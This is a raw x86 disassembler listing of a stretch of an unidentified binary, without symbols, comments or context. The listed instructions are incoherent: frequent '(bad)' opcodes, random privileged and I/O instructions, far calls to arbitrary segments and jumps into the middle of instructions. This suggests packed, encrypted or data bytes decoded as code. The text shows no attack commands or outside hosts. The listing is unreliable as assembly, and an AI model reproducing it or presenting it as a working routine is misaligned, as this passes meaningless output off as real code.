  423b97:	fmul   DWORD PTR [esi-0x475b9eba]
  423b9d:	mov    al,ds:0x240e561
  423ba2:	dec    esp
  423ba3:	and    al,0xe6
  423ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ba6:	push   cs
  423ba7:	push   cs
  423ba8:	fcmovnbe st,st(5)
  423baa:	jns    0x423c13
  423bac:	sbb    DWORD PTR [ebx-0x7eb02c02],eax
  423bb2:	lods   eax,DWORD PTR ds:[esi]
  423bb3:	stos   DWORD PTR es:[edi],eax
  423bb4:	add    edx,eax
  423bb6:	pop    ecx
  423bb7:	(bad)  [esp+esi*1]
  423bba:	sub    al,dl
  423bbc:	mov    edx,0xf887aaf1
  423bc1:	rol    BYTE PTR [ebp+0x159f7f99],1
  423bc7:	pop    eax
  423bc8:	mov    ebx,0x977126d8
  423bcd:	sahf   
  423bce:	pop    es
  423bcf:	mov    DWORD PTR [esi+0x5eb0ddff],esp
  423bd5:	push   0x35
  423bd7:	fidivr WORD PTR [edx-0x10b7b3d6]
  423bdd:	repnz test BYTE PTR [eax+0x23],ch
  423be1:	ins    DWORD PTR es:[edi],dx
  423be2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423be3:	and    DWORD PTR [ebx-0x25fa4365],edi
  423be9:	pop    ds
  423bea:	pop    es
  423beb:	add    ebp,esp
  423bed:	es inc ebp
  423bef:	sbb    ebp,DWORD PTR [eax+ebx*2+0x50]
  423bf3:	scas   eax,DWORD PTR es:[edi]
  423bf4:	pop    es
  423bf5:	pop    ecx
  423bf6:	into   
  423bf7:	int    0xe4
  423bf9:	nop
  423bfa:	jge    0x423ba2
  423bfc:	and    dl,BYTE PTR [edi-0xc]
  423bff:	sbb    edi,DWORD PTR [eax-0x6d95ae57]
  423c05:	fmul   DWORD PTR [eax+0x62c3a599]
  423c0b:	cmp    al,0x2e
  423c0d:	push   es
  423c0e:	repnz adc cl,ch
	...
  423c71:	add    BYTE PTR [eax],al
  423c73:	add    ch,bh
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x1c446617]
  423c81:	js     0x423c1a
  423c83:	xor    BYTE PTR [ecx],ch
  423c85:	jle    0x423c88
  423c87:	add    BYTE PTR ds:0x95000001,al
  423c8d:	sub    edx,DWORD PTR [ebp-0x2d1a5c31]
  423c93:	arpl   WORD PTR [edx],cx
  423c95:	fs imul ebp,esi,0xffffffb0
  423c99:	les    ebx,FWORD PTR [ebx+0x49a2ea81]
  423c9f:	shr    BYTE PTR [edx-0x13efcff2],cl
  423ca5:	and    DWORD PTR [eax+0x3b7f3075],edi
  423cab:	push   esi
  423cac:	dec    edx
  423cad:	es mov eax,ecx
  423cb0:	sahf   
  423cb1:	and    ax,0x5d7a
  423cb5:	cdq    
  423cb6:	sub    esp,esp
  423cb8:	outs   dx,DWORD PTR ds:[esi]
  423cb9:	push   cs
  423cba:	popa   
  423cbb:	fistp  QWORD PTR [edi]
  423cbd:	popf   
  423cbe:	les    edx,FWORD PTR [ebp-0x59]
  423cc1:	pop    ds
  423cc2:	xchg   ebx,eax
  423cc3:	sbb    bh,BYTE PTR [ecx]
  423cc5:	inc    ecx
  423cc6:	loop   0x423c48
  423cc8:	pop    ebp
  423cc9:	pusha  
  423cca:	stos   BYTE PTR es:[edi],al
  423ccb:	pusha  
  423ccc:	mov    dh,0x75
  423cce:	inc    eax
  423ccf:	adc    edx,DWORD PTR [ecx-0x5f]
  423cd2:	jno    0x423c60
  423cd4:	sbb    eax,0xe80e5e0c
  423cd9:	sub    al,0x81
  423cdb:	mov    esp,0x6c9dba10
  423ce0:	and    eax,0x40ee255c
  423ce5:	cdq    
  423ce6:	adc    dl,dl
  423ce8:	in     al,dx
  423ce9:	repz push edx
  423ceb:	or     eax,0x80326a41
  423cf0:	xchg   ebp,eax
  423cf1:	scas   eax,DWORD PTR es:[edi]
  423cf2:	retfw  0x542d
  423cf6:	(bad)  
  423cf7:	div    BYTE PTR [esi+0x7c]
  423cfa:	adc    ch,dh
  423cfc:	jno    0x423ccc
  423cfe:	sub    ebx,esi
  423d00:	dec    ecx
  423d01:	not    BYTE PTR [ebp+0x6645b98d]
  423d07:	sub    ah,bh
  423d09:	or     al,0x2f
  423d0b:	push   es
  423d0c:	pushf  
  423d0d:	add    BYTE PTR [ecx+eiz*8+0x6a],ch
  423d11:	cmc    
  423d12:	cmp    al,0xe3
  423d14:	add    DWORD PTR [ebx-0x16],0x57
  423d18:	call   0x26c:0x97910eb8
  423d1f:	fstp   DWORD PTR ds:0xa047d0f7
  423d25:	xor    ah,cl
  423d27:	sub    al,BYTE PTR [ebx+0x3]
  423d2a:	arpl   WORD PTR [ebx+0x34e87765],sp
  423d30:	mov    eax,ds:0xdaa6f9e9
  423d35:	mov    WORD PTR [esp+ebp*4-0x6486e611],ss
  423d3c:	out    0x3,al
  423d3e:	add    DWORD PTR [eax],esi
  423d40:	repnz push eax
  423d42:	jnp    0x423d4a
  423d44:	bound  ebp,QWORD PTR [ecx]
  423d46:	mov    ebp,0xc662b0d3
  423d4b:	and    bh,BYTE PTR [ecx+0x79]
  423d4e:	inc    ebx
  423d4f:	sahf   
  423d50:	pop    ecx
  423d51:	mov    WORD PTR [ecx+0x753a7be2],?
  423d57:	aad    0x7a
  423d59:	es je  0x423d75
  423d5c:	mov    dl,0x7
  423d5e:	int    0x97
  423d60:	lods   al,BYTE PTR ds:[esi]
  423d61:	rcl    edx,cl
  423d63:	inc    eax
  423d64:	enter  0x9223,0xa7
  423d68:	int3   
  423d69:	icebp  
  423d6a:	in     eax,dx
  423d6b:	adc    eax,0x987e6b98
  423d70:	or     ebp,DWORD PTR [esi+0x29]
  423d73:	rol    BYTE PTR [ebx-0x59],0x52
  423d77:	ret    0x1399
  423d7a:	jle    0x423d52
  423d7c:	mov    dh,0xad
  423d7e:	jns    0x423d81
  423d80:	pop    esi
  423d81:	xchg   ebx,eax
  423d82:	fisub  WORD PTR [edx+0x3858846]
  423d88:	mov    ds:0xa4a1069b,eax
  423d8d:	popa   
  423d8e:	adc    eax,0x7ca
	...
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax+0x67081ed2],esp
  423e03:	mov    ebp,0x17f2e
  423e08:	add    eax,0xae000001
  423e0d:	jno    0x423e58
  423e0f:	ds in  al,dx
  423e11:	sbb    esp,DWORD PTR [edx]
  423e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e14:	stos   DWORD PTR es:[edi],eax
  423e15:	xchg   esp,eax
  423e16:	idiv   DWORD PTR [ebp-0x1c9d048d]
  423e1c:	or     ch,BYTE PTR [eax-0x4b4537a1]
  423e22:	pop    ebx
  423e23:	adc    DWORD PTR [edx+0x5bc2fb57],ebx
  423e29:	sahf   
  423e2a:	jmp    0x423e26
  423e2c:	mov    ebx,0x960baeee
  423e31:	shl    BYTE PTR [eax-0x4780cf12],1
  423e37:	or     ebx,DWORD PTR [edi-0x7494c641]
  423e3d:	add    DWORD PTR [esi+eiz*2],edi
  423e40:	push   0xffffffd1
  423e42:	push   bp
  423e44:	cmc    
  423e45:	adc    al,0x78
  423e47:	into   
  423e48:	sbb    al,0xee
  423e4a:	ss stc 
  423e4c:	xchg   BYTE PTR [ecx+0x5a14483f],dl
  423e52:	ror    DWORD PTR [esi+eax*1+0x62a2e0e1],1
  423e59:	or     ebp,DWORD PTR [edi]
  423e5b:	mov    bh,0xb9
  423e5d:	jns    0x423e2b
  423e5f:	jbe    0x423ea8
  423e61:	and    BYTE PTR ds:0xc6eb8514,bl
  423e67:	(bad)  
  423e68:	pop    edx
  423e69:	push   esi
  423e6a:	adc    BYTE PTR [eax],bh
  423e6c:	loope  0x423e69
  423e6e:	retf   0xd799
  423e71:	jmp    0x423e57
  423e73:	mov    esi,0x98292f26
  423e78:	mov    cl,0xa5
  423e7a:	push   ebx
  423e7b:	inc    ebp
  423e7c:	es loope 0x423ea3
  423e7f:	enter  0xdac9,0x59
  423e83:	xor    eax,0xf577326b
  423e88:	rcl    BYTE PTR [ebp+0x12],cl
  423e8b:	aaa    
  423e8c:	js     0x423eab
  423e8e:	inc    ebx
  423e8f:	inc    ecx
  423e90:	xor    al,0x4f
  423e92:	pop    edx
  423e93:	mov    ch,0xe2
  423e95:	mov    BYTE PTR cs:[ecx+0x3377432d],bh
  423e9c:	mov    al,BYTE PTR [eax+0x61c5a32d]
  423ea2:	xor    al,0x51
  423ea4:	push   ecx
  423ea5:	hlt    
  423ea6:	lahf   
  423ea7:	add    eax,0x7e314a6c
  423eac:	(bad)  
  423ead:	jecxz  0x423f21
  423eaf:	stos   DWORD PTR es:[edi],eax
  423eb0:	cmp    DWORD PTR [eax+0x50246ad5],edi
  423eb6:	inc    edx
  423eb7:	inc    edi
  423eb8:	add    al,0xa2
  423eba:	shl    DWORD PTR [eax],1
  423ebc:	inc    edi
  423ebd:	shl    DWORD PTR [ebx+0x3704aa77],cl
  423ec3:	and    eax,0x52e7434e
  423ec8:	mov    ebx,0xe6a04bfb
  423ecd:	sub    DWORD PTR [ebx-0x1c7937ad],ebp
  423ed3:	push   ds
  423ed4:	xor    al,0x83
  423ed6:	push   eax
  423ed7:	and    cl,BYTE PTR [ebp+0x3d]
  423eda:	ins    DWORD PTR es:[edi],dx
  423edb:	dec    ebx
  423edc:	fistp  QWORD PTR ds:0x947038fd
  423ee2:	add    eax,0x4a0358e6
  423ee7:	call   0xae74b298
  423eec:	jg     0x423f07
  423eee:	sub    dl,BYTE PTR [edx]
  423ef0:	popa   
  423ef1:	add    al,0x75
  423ef3:	das    
  423ef4:	add    eax,0xd2830d67
  423ef9:	cld    
  423efa:	xchg   ebp,eax
  423efb:	inc    edi
  423efc:	adc    eax,0x2126c77b
  423f01:	mov    bh,0xff
  423f03:	xchg   edi,eax
  423f04:	leave  
  423f05:	(bad)  
  423f06:	mov    edi,0x21bc3eba
  423f0b:	test   BYTE PTR [eax],bl
  423f0d:	add    esi,DWORD PTR [ebx+0x55]
  423f10:	add    BYTE PTR [bx+si],al
	...
  423f73:	add    BYTE PTR [esi+0x74b9649a],ch
  423f79:	(bad)  
  423f7a:	call   FWORD PTR [edi-0x26e369ec]
  423f80:	pop    edi
  423f81:	pushf  
  423f82:	cmp    al,0x3d
  423f84:	xor    eax,DWORD PTR [eax+0x1050001]
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	(bad)  
  423f8e:	aad    0x1
  423f90:	push   0x6f4b0005
  423f95:	pop    esp
  423f96:	fadd   DWORD PTR [esi]
  423f98:	test   bh,0x97
  423f9b:	mov    ebp,0x32f84786
  423fa0:	cmp    al,0xa8
  423fa2:	and    DWORD PTR [ecx-0x6fbb4541],esp
  423fa8:	xor    BYTE PTR [edi+edi*2-0x56d9189a],0x8b
  423fb0:	jne    0x423f82
  423fb2:	pushf  
  423fb3:	xor    al,0xff
  423fb5:	mov    ebx,0x3fb338dd
  423fba:	jge    0x424024
  423fbc:	std    
  423fbd:	adc    cl,0x49
  423fc0:	js     0x423fdc
  423fc2:	femms  
  423fc4:	xor    bl,bh
  423fc6:	dec    ebp
  423fc7:	and    al,0x22
  423fc9:	and    BYTE PTR [esi+0xaaae732],ch
  423fcf:	sbb    BYTE PTR [edx-0x55dc18da],bl
  423fd5:	add    BYTE PTR [ecx+eax*2],ah
  423fd8:	sbb    BYTE PTR [ecx-0x6],bl
  423fdb:	(bad)  
  423fdc:	xchg   esi,eax
  423fdd:	pushf  
  423fde:	test   eax,0xcee12bdd
  423fe3:	and    BYTE PTR [edx-0xe],cl
  423fe6:	inc    esp
  423fe7:	sub    al,0x2
  423fe9:	pop    esi
  423fea:	test   eax,0xce63dec2
  423fef:	adc    DWORD PTR [ebp-0xe7c228b],0x48
  423ff6:	popf   
  423ff7:	inc    ebx
  423ff8:	int3   
  423ff9:	fcmovb st,st(5)
  423ffb:	jno    0x42406b
  423ffd:	and    ecx,DWORD PTR [ecx]
  423fff:	pusha  
  424000:	popf   
  424001:	or     al,0x7
  424003:	sub    BYTE PTR [edi+0x773cc1fd],ah
  424009:	mov    ebp,0xdc809fdf
  42400e:	adc    BYTE PTR [eax-0x49],cl
  424011:	mov    esi,ss
  424013:	das    
  424014:	ret    
  424015:	lahf   
  424016:	fild   QWORD PTR [esi+0x1d]
  424019:	test   al,dh
  42401b:	lods   al,BYTE PTR ds:[esi]
  42401c:	in     al,dx
  42401d:	fcomp  st(7)
  42401f:	or     eax,0x2deb934c
  424024:	adc    eax,0xecfaa61d
  424029:	cwde   
  42402a:	and    ebp,esi
  42402c:	cli    
  42402d:	sub    eax,0x190ef537
  424032:	add    al,0x56
  424034:	xchg   al,bh
  424036:	test   al,0xaf
  424038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424039:	cmc    
  42403a:	and    cl,BYTE PTR [edi]
  42403c:	inc    esp
  42403d:	jb     0x423fee
  42403f:	sub    ebp,DWORD PTR [esi-0x5de0a964]
  424045:	sbb    bl,bh
  424047:	(bad)  
  424049:	call   0x1f6aa6a5
  42404e:	mov    dh,bh
  424050:	loop   0x424079
  424052:	inc    ebx
  424053:	sar    esp,0x92
  424056:	lods   al,BYTE PTR ds:[esi]
  424057:	ret    0x5eeb
  42405a:	nop
  42405b:	sahf   
  42405c:	add    al,0xca
  42405e:	imul   ebx,DWORD PTR [ebx],0xb2165388
  424064:	cmp    ebp,DWORD PTR [eax]
  424066:	sub    BYTE PTR [esi-0x3727db22],bh
  42406c:	int3   
  42406d:	and    esi,DWORD PTR [ecx+ebp*8+0x2395ca17]
  424074:	test   eax,edx
  424076:	ret    0x74aa
  424079:	inc    edx
  42407a:	add    al,0x8d
  42407c:	ret    0x92e5
  42407f:	dec    edi
  424080:	or     dl,BYTE PTR [edi]
  424082:	xor    DWORD PTR [ecx],edi
  424084:	std    
  424085:	lea    edx,[eax+edx*2-0x270e03f9]
  42408c:	mov    al,0x38
  42408e:	or     DWORD PTR [edi+0x30],eax
	...
  4240f1:	add    BYTE PTR [eax],al
  4240f3:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  4240f7:	mov    cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	(bad)  
  424101:	sub    eax,0x8138410f
  424106:	add    DWORD PTR [eax],eax
  424108:	add    eax,0xc9000001
  42410d:	dec    edx
  42410e:	ret    
  42410f:	leave  
  424110:	pop    esi
  424111:	add    bh,0x79
  424114:	pop    edx
  424115:	xchg   ebp,eax
  424116:	mov    es,esp
  424118:	ds pop ss
  42411a:	retf   0x8ef7
  42411d:	sub    edi,ebx
  42411f:	sti    
  424120:	popa   
  424121:	inc    esp
  424122:	(bad)
  424126:	pop    ebx
  424127:	xchg   ecx,eax
  424128:	and    eax,0x9aa22ac8
  42412d:	cmp    ecx,DWORD PTR [edx]
  42412f:	cld    
  424130:	adc    BYTE PTR [ebx],dh
  424132:	jns    0x424133
  424134:	data16 fisttp QWORD PTR [edi+0x7e]
  424138:	sbb    al,0xa1
  42413a:	out    dx,al
  42413b:	pop    esp
  42413c:	ret    
  42413d:	push   0xa0fdd7ee
  424142:	jns    0x4240f7
  424144:	sti    
  424145:	icebp  
  424146:	inc    eax
  424147:	ret    
  424148:	pop    eax
  424149:	out    dx,al
  42414a:	dec    ecx
  42414b:	daa    
  42414c:	xor    al,0xe2
  42414e:	mov    cl,0xb
  424150:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424151:	retf   0xf1d8
  424154:	mov    bl,0x31
  424156:	fcomi  st,st(7)
  424158:	sbb    al,0xd9
  42415a:	out    0x15,eax
  42415c:	or     ah,BYTE PTR [eax-0x4e]
  42415f:	xor    dl,BYTE PTR [ebx-0x37d8201b]
  424165:	imul   edi,DWORD PTR [ecx+ecx*1],0x3a
  424169:	add    ch,BYTE PTR [ebp-0x60]
  42416c:	dec    esi
  42416d:	sbb    ebp,ebx
  42416f:	cdq    
  424170:	out    dx,al
  424171:	fs mov esp,0x7218a495
  424177:	sbb    ecx,edi
  424179:	addr16 cmc 
  42417b:	push   ecx
  42417c:	pusha  
  42417d:	and    BYTE PTR ds:0xac118d43,bh
  424183:	pop    eax
  424184:	clc    
  424185:	add    dh,ah
  424187:	fucomip st,st(1)
  424189:	xchg   ebx,eax
  42418a:	into   
  42418b:	push   esp
  42418c:	xchg   DWORD PTR [ebp-0x36316551],esi
  424192:	pop    ss
  424193:	pusha  
  424194:	call   0xfd5a6c58
  424199:	dec    ecx
  42419a:	mov    dl,0x18
  42419c:	jb     0x424142
  42419e:	and    DWORD PTR [edx-0x5e1375b1],ecx
  4241a4:	repz mov bh,0xec
  4241a7:	jge    0x424153
  4241a9:	loope  0x42413d
  4241ab:	pop    ebx
  4241ac:	push   0xa10ebb31
  4241b1:	push   ebp
  4241b2:	repz cmp bh,BYTE PTR [edx-0x5e]
  4241b6:	inc    ebx
  4241b7:	mov    dl,0x5
  4241b9:	inc    eax
  4241ba:	and    DWORD PTR [ebp-0x76230afd],esp
  4241c0:	sub    ebx,edi
  4241c2:	fsubr  QWORD PTR [esi-0x51]
  4241c5:	pop    edi
  4241c6:	cmp    BYTE PTR [ecx],al
  4241c8:	out    0xe8,eax
  4241ca:	dec    edx
  4241cb:	dec    edx
  4241cc:	fsub   DWORD PTR [ecx]
  4241ce:	outs   dx,DWORD PTR ds:[esi]
  4241cf:	add    edi,ebx
  4241d1:	sbb    DWORD PTR [ebp-0x10],edx
  4241d4:	scas   eax,DWORD PTR es:[edi]
  4241d5:	cdq    
  4241d6:	fwait
  4241d7:	ds pop ebp
  4241d9:	push   es
  4241da:	lods   eax,DWORD PTR ds:[esi]
  4241db:	addr16 popa 
  4241dd:	enter  0x68bd,0x13
  4241e1:	pushf  
  4241e2:	pop    ebp
  4241e3:	pop    eax
  4241e4:	(bad)  
  4241e5:	mov    eax,ds:0x311fba01
  4241ea:	iret   
  4241eb:	sbb    edx,esi
  4241ed:	(bad)  
  4241ef:	push   esi
  4241f0:	or     ebp,edi
  4241f2:	leave  
  4241f3:	retf   
  4241f4:	sti    
  4241f5:	and    DWORD PTR [ecx-0x603f7e9b],0x6c6deb27
  4241ff:	int    0x9c
  424201:	dec    edx
  424202:	cmp    edi,eax
  424204:	aas    
  424205:	push   ecx
  424206:	sti    
  424207:	lods   eax,DWORD PTR ds:[esi]
  424208:	pop    ebp
  424209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42420a:	jg     0x424210
  42420c:	(bad)  
  42420d:	jae    0x424194
  42420f:	dec    eax
  424210:	xchg   ebx,eax
	...
  424271:	add    BYTE PTR [eax],al
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	add    al,0xb4
  424282:	call   0x500:0x1823dba
  424289:	add    DWORD PTR [eax],eax
  42428b:	add    bh,dh
  42428d:	dec    ecx
  42428e:	retf   0xeaff
  424291:	add    esi,DWORD PTR [edi+eax*1]
  424294:	mov    cl,0xb3
  424296:	jmp    0x35e2ccd8
  42429b:	dec    edx
  42429c:	inc    esp
  42429d:	aad    0xdd
  42429f:	pop    ds
  4242a0:	pusha  
  4242a1:	in     al,0x86
  4242a3:	int    0xda
  4242a5:	cdq    
  4242a6:	xchg   DWORD PTR [eax],ebx
  4242a8:	inc    ebx
  4242a9:	xchg   ebx,eax
  4242aa:	imul   eax,DWORD PTR [edx+ebx*4-0x6988a3b5],0xa5ba9941
  4242b5:	gs retf 0xa056
  4242b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242ba:	cmp    BYTE PTR [ebx],bl
  4242bc:	test   DWORD PTR [esi],esp
  4242be:	(bad)  
  4242bf:	lds    esi,FWORD PTR [edi+eax*8-0x6ca6813a]
  4242c6:	cmp    al,0xef
  4242c8:	and    eax,0x14b98df6
  4242cd:	dec    edi
  4242ce:	daa    
  4242cf:	pushf  
  4242d0:	mov    cl,0xfd
  4242d2:	stc    
  4242d3:	jns    0x42430e
  4242d5:	and    al,0xce
  4242d7:	ds (bad) 
  4242da:	enter  0xbf22,0x30
  4242de:	cmp    DWORD PTR [ebx-0x3816ca43],esi
  4242e4:	loope  0x42430f
  4242e6:	(bad)  
  4242e7:	adc    bl,dh
  4242e9:	retf   
  4242ea:	cmp    ecx,esi
  4242ec:	mov    al,0x37
  4242ee:	loopne 0x424314
  4242f0:	popf   
  4242f1:	adc    eax,DWORD PTR [ecx+ebp*4+0x43]
  4242f5:	lods   al,BYTE PTR ds:[esi]
  4242f6:	jge    0x424374
  4242f8:	xor    ebx,DWORD PTR [ebx+0x6]
  4242fb:	and    dl,BYTE PTR [edx+0x13]
  4242fe:	imul   edx,eax,0xffffffb8
  424301:	in     eax,dx
  424302:	(bad)  
  424303:	aam    0x86
  424305:	push   edi
  424306:	adc    edi,eax
  424308:	push   esi
  424309:	pop    ebx
  42430a:	mov    eax,0x18bd760c
  42430f:	bound  ecx,QWORD PTR [edx-0x49]
  424312:	pop    edi
  424313:	dec    edi
  424314:	or     edi,DWORD PTR [edi-0x5183bd53]
  42431a:	mov    dl,BYTE PTR [edi-0x30839024]
  424320:	jns    0x424390
  424322:	mov    esp,0x26c7664b
  424327:	and    BYTE PTR [edx*2-0x40c0b371],ah
  42432e:	mov    ds:0xa726f137,eax
  424333:	fimul  DWORD PTR ss:[eax+0x76]
  424337:	adc    BYTE PTR [eax+0x3],al
  42433a:	daa    
  42433b:	dec    esi
  42433c:	cmp    ah,BYTE PTR [edx-0x7a]
  42433f:	jle    0x42439e
  424341:	test   BYTE PTR [edx],dl
  424343:	dec    ecx
  424344:	lock xchg ebx,eax
  424346:	outs   dx,DWORD PTR ds:[esi]
  424347:	cmc    
  424348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424349:	cli    
  42434a:	popf   
  42434b:	push   0xfffffffe
  42434d:	scas   eax,DWORD PTR es:[edi]
  42434e:	or     esp,DWORD PTR [ebp+0x56ddd8e9]
  424354:	inc    edi
  424355:	inc    ebp
  424356:	stc    
  424357:	sbb    DWORD PTR [esi+0x58089399],eax
  42435d:	sub    DWORD PTR [edx+0x49],edx
  424360:	mov    eax,ds:0xb186dc38
  424365:	gs mov cl,0xa6
  424368:	jbe    0x424324
  42436a:	mov    edi,0xf648af23
  42436f:	push   ebx
  424370:	out    dx,eax
  424371:	frstor [esp+ebp*8+0x40ee0757]
  424378:	pop    ebp
  424379:	(bad)  
  42437a:	out    dx,al
  42437b:	sub    eax,ecx
  42437d:	(bad)  
  42437e:	aam    0x89
  424380:	(bad)  
  424381:	mov    ebx,0x18bdcbc3
  424386:	or     eax,0x6ee00ab5
  42438b:	and    al,BYTE PTR [ecx+eiz*4]
  42438e:	pop    ebp
  42438f:	cs out dx,al
	...
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x42442a
  424401:	fild   QWORD PTR [ecx]
  424403:	mov    es,WORD PTR [edx-0x7d]
  424406:	add    DWORD PTR [eax],eax
  424408:	add    eax,0xd8000001
  42440d:	sbb    BYTE PTR [ebx-0x3d1af22b],bl
  424413:	fnstsw WORD PTR [ebp+0x7f900ab0]
  424419:	pop    edx
  42441a:	jbe    0x4243f1
  42441c:	sahf   
  42441d:	adc    cl,BYTE PTR [edi+0x61]
  424420:	cdq    
  424421:	jle    0x42441b
  424423:	mul    DWORD PTR [eax+esi*4-0x47]
  424427:	scas   eax,DWORD PTR es:[edi]
  424428:	mov    ebp,0xc168c98e
  42442d:	and    BYTE PTR [eax-0x54cde4a5],al
  424433:	in     eax,0x9e
  424435:	es jo  0x42447b
  424438:	shl    esi,0xf1
  42443b:	cwde   
  42443c:	adc    cl,BYTE PTR [ecx+0x1f5cdf96]
  424442:	sar    BYTE PTR fs:[ebp+0x619db9d5],1
  424449:	sbb    eax,0xc8a1f4b3
  42444e:	stc    
  42444f:	fisubr DWORD PTR [ebx+0x18a03aba]
  424455:	jle    0x424492
  424457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424458:	dec    edx
  424459:	dec    edx
  42445a:	aam    0xb4
  42445c:	inc    esp
  42445d:	sbb    al,0x4a
  42445f:	bnd jns 0x424421
  424462:	daa    
  424463:	scas   eax,DWORD PTR es:[edi]
  424464:	sub    esi,DWORD PTR [ebx]
  424466:	rcl    DWORD PTR [eax+0x3a],0x77
  42446a:	mov    bl,0xd
  42446c:	dec    ebx
  42446d:	jle    0x424473
  42446f:	adc    eax,0x56f095ab
  424474:	jmp    0x424466
  424476:	data16 sti 
  424478:	(bad)  
  424479:	jae    0x4244e9
  42447b:	fnstcw WORD PTR [esi+0x6]
  42447e:	pop    esp
  42447f:	pop    ebp
  424480:	sbb    eax,0x3d54508
  424485:	inc    ebp
  424486:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424487:	and    bl,BYTE PTR [ebx-0x49]
  42448a:	mov    cl,0x35
  42448c:	sahf   
  42448d:	fwait
  42448e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42448f:	icebp  
  424490:	push   ebp
  424491:	inc    ebx
  424492:	pop    esi
  424493:	or     BYTE PTR [edx+eiz*1-0x7c],al
  424497:	xchg   ebx,eax
  424498:	ret    
  424499:	push   ds
  42449a:	(bad)  
  42449b:	sbb    edi,esp
  42449d:	dec    DWORD PTR [eax+0x4f]
  4244a0:	je     0x424494
  4244a2:	ins    BYTE PTR es:[edi],dx
  4244a3:	(bad)  
  4244a4:	stc    
  4244a5:	mov    bl,0x26
  4244a7:	mov    DWORD PTR [edi-0xc2199ae],esp
  4244ad:	xchg   edx,eax
  4244ae:	jnp    0x4244ea
  4244b0:	xor    DWORD PTR [edx-0x6a6209dc],eax
  4244b6:	ja     0x424518
  4244b8:	pop    esp
  4244b9:	mov    ecx,0x5b868938
  4244be:	je     0x424505
  4244c0:	pusha  
  4244c1:	test   eax,0xd1457230
  4244c6:	jecxz  0x4244cf
  4244c8:	sub    al,0x34
  4244ca:	push   0x38
  4244cc:	ins    DWORD PTR es:[edi],dx
  4244cd:	out    dx,al
  4244ce:	ret    
  4244cf:	test   BYTE PTR [ebx-0x3ac7a327],dh
  4244d5:	sub    ecx,edi
  4244d7:	call   DWORD PTR [edx+eiz*2-0x37]
  4244db:	mov    cl,0x9d
  4244dd:	add    DWORD PTR [ebp-0x3aa2b27b],ebp
  4244e3:	dec    edi
  4244e4:	lea    ecx,[edx+0x475dbd77]
  4244ea:	shl    BYTE PTR [ebx-0x1bc85b35],cl
  4244f0:	(bad)  
  4244f1:	cmc    
  4244f2:	pushf  
  4244f3:	in     al,0x15
  4244f5:	dec    esi
  4244f6:	pop    esp
  4244f7:	pop    eax
  4244f8:	into   
  4244f9:	mov    al,0xc
  4244fb:	jns    0x42447f
  4244fd:	fs adc esi,eax
  424500:	cmc    
  424501:	mov    ch,0x99
  424503:	lods   eax,DWORD PTR ds:[esi]
  424504:	ror    DWORD PTR [ecx+0x41],0xec
  424508:	(bad)  
  42450a:	sbb    eax,0x29111f18
  42450f:	pushf  
  424510:	mov    DWORD PTR [eax],0x0
	...
  424572:	add    BYTE PTR [eax],al
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4+0x6e],1
  424581:	shl    DWORD PTR [si+0x47],0x84
  424586:	add    DWORD PTR [eax],eax
  424588:	add    eax,0xb000001
  42458d:	arpl   WORD PTR [esi+eiz*2-0x4fd83289],cx
  424594:	mov    esi,esp
  424596:	shl    DWORD PTR [ecx],cl
  424598:	cmp    eax,0x718d368e
  42459d:	in     al,dx
  42459e:	inc    edi
  42459f:	mov    ebp,0x667cc80d
  4245a4:	popf   
  4245a5:	jecxz  0x424590
  4245a7:	and    eax,0xf4a47a2b
  4245ac:	add    BYTE PTR [eax-0x759b0b42],dh
  4245b2:	mov    WORD PTR [esi+0x5e],es
  4245b5:	sub    al,0xec
  4245b7:	jne    0x42458b
  4245b9:	adc    al,0x55
  4245bb:	(bad)  
  4245bc:	dec    eax
  4245bd:	sub    eax,DWORD PTR [eax-0x23]
  4245c0:	mov    eax,ds:0x39688380
  4245c5:	dec    ebx
  4245c6:	ret    0x3073
  4245c9:	sbb    eax,0x80129f67
  4245ce:	xor    al,0x75
  4245d0:	sbb    al,0xe
  4245d2:	ficomp DWORD PTR [esi+0x5e272b07]
  4245d8:	jmpw   0x2b7
  4245dc:	fistp  DWORD PTR [ecx-0x393a3032]
  4245e2:	push   es
  4245e3:	xchg   ebx,eax
  4245e4:	add    ebx,DWORD PTR [ebp+0x1b2ce78f]
  4245ea:	scas   al,BYTE PTR es:[edi]
  4245eb:	xchg   edi,eax
  4245ec:	test   al,0x27
  4245ee:	nop    edx
  4245f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245f2:	inc    eax
  4245f3:	adc    ebx,ebp
  4245f5:	and    edx,edx
  4245f7:	sbb    esp,DWORD PTR [eax]
  4245f9:	ror    dh,cl
  4245fb:	aas    
  4245fc:	pop    ss
  4245fd:	or     al,0x7a
  4245ff:	jp     0x424674
  424601:	popf   
  424602:	aam    0x36
  424604:	sbb    esi,DWORD PTR [ecx+0x535d347]
